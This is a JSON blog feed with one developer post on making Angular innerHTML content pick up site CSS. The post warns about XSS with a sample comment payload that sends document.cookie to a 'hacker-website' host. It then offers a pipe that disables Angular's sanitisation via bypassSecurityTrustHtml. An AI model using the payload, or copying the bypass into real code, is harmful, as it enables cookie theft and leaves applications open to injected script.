{
  "status": "ok",
  "feed": {
    "url": "",
    "title": "Stories by Jesse Carlberg",
    "link": "",
    "author": "",
    "description": "Stories by Jesse Carlberg",
    "image": ""
  },
  "items": [
    {
      "title": "Angular innerHTML not taking CSS",
      "pubDate": "2019-06-01 19:15:32",
      "link": "",
      "guid": "",
      "author": "Jesse Carlberg",
      "thumbnail": "../assets/blog/pics/angularicon.png",
      "description": "<h1>Angular innerHTML not taking CSS</h1> <p><img src=\"../assets/blog/pics/angularicon.png\" alt=\"N|Solid\"></p> <p>I ran into this issue with building this vary blog.</p> <ul> <li>Display blog posts from JSON correctly</li> <li>Use websites CSS</li> <li>Angular Magic</li> </ul> <h1>Scenario</h1> <ul> <li>My blog posts come back as JSON from the DB</li> <li>Showing the HTML inline correctly</li> </ul> <p>My blog.component.html looks like:</p> <pre><code class=\"language-sh\">&lt;section id=&quot;mainblog&quot; class=&quot;blogContainer&quot;&gt; &lt;mat-card class=&quot;blogCard&quot; *ngFor=&quot;let item of feed.items; let i = index&quot;&gt; &lt;mat-card-header&gt; &lt;mat-card-title&gt;{{ item.title }}&lt;/mat-card-title&gt; &lt;/mat-card-header&gt; &lt;mat-card-content&gt; &lt;div [innerHTML]=&quot;item.content&quot;&gt;&lt;/div&gt; &lt;/mat-card-content&gt; &lt;/mat-card&gt; &lt;/section&gt; </code></pre> <p>The main code being:</p> <pre><code class=\"language-sh\"> &lt;div [innerHTML]=&quot;item.content&quot;&gt;&lt;/div&gt; </code></pre> <p>When the JSON returns the blogs to display, the Material card wasn't displaying the content correctly.</p> <p>Here you can see the images were hanging off the side of the card: <img src=\"../assets/blog/pics/innerhtmlerror.png\" alt=\"InnerHtml Error\"></p> <h1>Add the ViewEncapsulation</h1> <pre><code class=\"language-sh\">import { Component, OnInit, ChangeDetectionStrategy, ViewEncapsulation, } from '@angular/core'; @Component({ selector: 'app-blog', templateUrl: './blog.component.html', styleUrls: ['./blog.component.scss'], changeDetection: ChangeDetectionStrategy.Default, encapsulation: ViewEncapsulation.None }) </code></pre> <p>By adding in the ViewEncapsulation.None we can see the HTML is now being rendered correctly: <img src=\"../assets/blog/pics/innerhtmlnoerror.png\" alt=\"InnerHtml Error\"></p> <p>And whene we look at the Div elements the CSS is now being applied correctly: <img src=\"../assets/blog/pics/innerhtmlcss.png\" alt=\"InnerHtml Error\"></p> <h1>But wait!</h1> <p>Cross-site Scripting or XSS is probably the most common website security vulnerability. It enables an attacker to inject client-side script into web pages viewed by other users. So, you want to be real careful on what kind of data you are returning and then displaying. The most notable way to see this exploitation is in a comments section of a website.</p> <p>A vulnerability in cross-site scripting would be if a someone put a comment of:</p> <pre><code class=\"language-sh\"> &lt;script&gt; window.location=’http://hacker-website/?cookie='+document.cookie &lt;/script&gt; </code></pre> <p>Now the website will redirect to the hacker website anytime the comments are loaded in the encapsulation.</p> <h1>Angular has built in protection for XSS:</h1> <blockquote> <p>Angular treats all values as untrusted by default. When a value is inserted into the DOM from a template, via property, attribute, style, class binding, or interpolation, Angular sanitizes and escapes untrusted values.</p> </blockquote> <p>But if you need to bypass this built in security feature and have your links shown correclty you just need to add in a sanitzer pipe. This Pipe will use the DomSanitizer service like:</p> <pre><code class=\"language-sh\"> &lt;div [innerHTML]=&quot;item.content| safeHtml&quot;&gt;&lt;/div&gt; </code></pre> <p>The Pipe looks like this in the Angular project:</p> <pre><code class=\"language-sh\"> import { Pipe, PipeTransform } from '@angular/core'; import { DomSanitizer } from '@angular/platform-browser'; @Pipe({ name: 'safeHtml', }) export class SafeHtmlPipe implements PipeTransform { constructor(private sanitizer: DomSanitizer) {} transform(html) { return this.sanitizer.bypassSecurityTrustHtml(html); } } </code></pre> <p>For more information on cross-scite scripting(XSS) hit up this <a href=\"https://angular.io/guide/security\">link</a></p>",
      "content": "<h1>Angular innerHTML not taking CSS</h1> <p><img src=\"../assets/blog/pics/angularicon.png\" alt=\"N|Solid\"></p> <p>I ran into this issue with building this vary blog.</p> <ul> <li>Display blog posts from JSON correctly</li> <li>Use websites CSS</li> <li>Angular Magic</li> </ul> <h1>Scenario</h1> <ul> <li>My blog posts come back as JSON from the DB</li> <li>Showing the HTML inline correctly</li> </ul> <p>My blog.component.html looks like:</p> <pre><code class=\"language-sh\">&lt;section id=&quot;mainblog&quot; class=&quot;blogContainer&quot;&gt; &lt;mat-card class=&quot;blogCard&quot; *ngFor=&quot;let item of feed.items; let i = index&quot;&gt; &lt;mat-card-header&gt; &lt;mat-card-title&gt;{{ item.title }}&lt;/mat-card-title&gt; &lt;/mat-card-header&gt; &lt;mat-card-content&gt; &lt;div [innerHTML]=&quot;item.content&quot;&gt;&lt;/div&gt; &lt;/mat-card-content&gt; &lt;/mat-card&gt; &lt;/section&gt; </code></pre> <p>The main code being:</p> <pre><code class=\"language-sh\"> &lt;div [innerHTML]=&quot;item.content&quot;&gt;&lt;/div&gt; </code></pre> <p>When the JSON returns the blogs to display, the Material card wasn't displaying the content correctly.</p> <p>Here you can see the images were hanging off the side of the card: <img src=\"../assets/blog/pics/innerhtmlerror.png\" alt=\"InnerHtml Error\"></p> <h1>Add the ViewEncapsulation</h1> <pre><code class=\"language-sh\">import { Component, OnInit, ChangeDetectionStrategy, ViewEncapsulation, } from '@angular/core'; @Component({ selector: 'app-blog', templateUrl: './blog.component.html', styleUrls: ['./blog.component.scss'], changeDetection: ChangeDetectionStrategy.Default, encapsulation: ViewEncapsulation.None }) </code></pre> <p>By adding in the ViewEncapsulation.None we can see the HTML is now being rendered correctly: <img src=\"../assets/blog/pics/innerhtmlnoerror.png\" alt=\"InnerHtml Error\"></p> <p>And whene we look at the Div elements the CSS is now being applied correctly: <img src=\"../assets/blog/pics/innerhtmlcss.png\" alt=\"InnerHtml Error\"></p> <h1>But wait!</h1> <p>Cross-site Scripting or XSS is probably the most common website security vulnerability. It enables an attacker to inject client-side script into web pages viewed by other users. So, you want to be real careful on what kind of data you are returning and then displaying. The most notable way to see this exploitation is in a comments section of a website.</p> <p>A vulnerability in cross-site scripting would be if a someone put a comment of:</p> <pre><code class=\"language-sh\"> &lt;script&gt; window.location=’http://hacker-website/?cookie='+document.cookie &lt;/script&gt; </code></pre> <p>Now the website will redirect to the hacker website anytime the comments are loaded in the encapsulation.</p> <h1>Angular has built in protection for XSS:</h1> <blockquote> <p>Angular treats all values as untrusted by default. When a value is inserted into the DOM from a template, via property, attribute, style, class binding, or interpolation, Angular sanitizes and escapes untrusted values.</p> </blockquote> <p>But if you need to bypass this built in security feature and have your links shown correclty you just need to add in a sanitzer pipe. This Pipe will use the DomSanitizer service like:</p> <pre><code class=\"language-sh\"> &lt;div [innerHTML]=&quot;item.content| safeHtml&quot;&gt;&lt;/div&gt; </code></pre> <p>The Pipe looks like this in the Angular project:</p> <pre><code class=\"language-sh\"> import { Pipe, PipeTransform } from '@angular/core'; import { DomSanitizer } from '@angular/platform-browser'; @Pipe({ name: 'safeHtml', }) export class SafeHtmlPipe implements PipeTransform { constructor(private sanitizer: DomSanitizer) {} transform(html) { return this.sanitizer.bypassSecurityTrustHtml(html); } } </code></pre> <p>For more information on cross-scite scripting(XSS) hit up this <a href=\"https://angular.io/guide/security\">link</a></p>",
      "enclosure": {},
      "categories": [
        "angular",
        "coding",
        "front-end"
      ]
    }
  ]
}
